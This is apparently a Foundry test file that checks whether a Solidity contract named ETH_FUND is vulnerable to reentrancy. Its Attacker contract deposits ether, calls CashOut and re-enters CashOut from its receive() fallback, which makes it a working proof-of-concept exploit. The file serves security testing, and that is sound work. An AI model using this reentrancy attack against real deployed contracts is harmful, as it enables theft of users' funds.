
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_FUND,Log} from "../src/ETH_FUND.sol";

contract TestReentrancyETH_FUND is Test {
    ETH_FUND public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_FUND(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_FUND public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public attackAmount;

    constructor(address victimAddress) {
        victim = ETH_FUND(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.CashOut(val);
        
        if (address(this).balance >= val * 2 && address(victim).balance < initialVictimBalance - val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.CashOut(attackAmount);
        }
    }
}
